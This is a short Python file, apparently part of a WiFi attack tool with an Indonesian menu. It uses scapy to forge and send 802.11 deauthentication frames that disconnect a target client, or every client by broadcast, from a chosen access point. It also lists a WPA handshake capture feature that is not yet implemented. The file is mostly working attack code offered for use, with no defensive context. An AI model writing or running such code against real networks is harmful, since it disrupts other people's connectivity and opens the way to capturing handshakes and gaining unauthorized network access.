from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def attack_menu():
    print("[*] Menu attack")
    print("1. Capture handshake WPA/WPA2 (belum diimplementasi)")
    print("2. Serangan deauth")
    print("3. Kembali ke menu utama")
    choice = input("Pilih aksi: ").strip()
    if choice == '1':
        print("Fitur capture handshake akan dikembangkan...")
    elif choice == '2':
        do_deauth_attack()
    else:
        print("Kembali ke menu utama.")

def do_deauth_attack():
    iface = input("Masukkan interface WiFi (mode monitor, contoh: wlan0mon): ").strip()
    bssid = input("Masukkan BSSID target (AP/router, contoh: AA:BB:CC:DD:EE:FF): ").strip()
    client = input("Masukkan client target (STATION, contoh: 11:22:33:44:55:66 atau ff:ff:ff:ff:ff:ff untuk broadcast): ").strip()
    try:
        count = int(input("Jumlah paket deauth yang dikirim (misal: 50): ").strip())
    except:
        count = 50

    print(f"[*] Mengirim {count} paket deauth dari {bssid} ke {client} via {iface} ...")
    pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    try:
        sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
        print("[+] Selesai.")
    except Exception as e:
        print(f"[!] Error: {e}")
